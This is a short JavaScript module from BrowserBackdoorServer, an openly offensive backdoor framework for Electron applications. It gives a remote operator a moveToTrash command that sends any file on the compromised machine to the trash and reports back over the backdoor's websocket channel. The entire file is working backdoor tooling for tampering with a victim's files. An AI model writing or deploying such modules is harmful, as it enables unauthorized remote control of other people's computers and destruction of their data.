// INTERACTIVE
/*
 * Copyright (c) 2016 Carleton Stuberg - http://imcpwn.com
 * BrowserBackdoorServer by IMcPwn.
 * See the file 'LICENSE' for copying permission
 *
 * Info: Moves a file to the trash
 * Parameters: fullPath
 * Returns: undefined
 * Author: IMcPwn
 */

electron = require('electron');

moveToTrash = function (fullPath) {
    electron.shell.moveItemToTrash(fullPath);
    ws.send("Moved " + fullPath + " to trash.");
}

ws.send("\nUsage: moveToTrash(fullPath)\n- fullPath is the properly escaped full path of the file.");
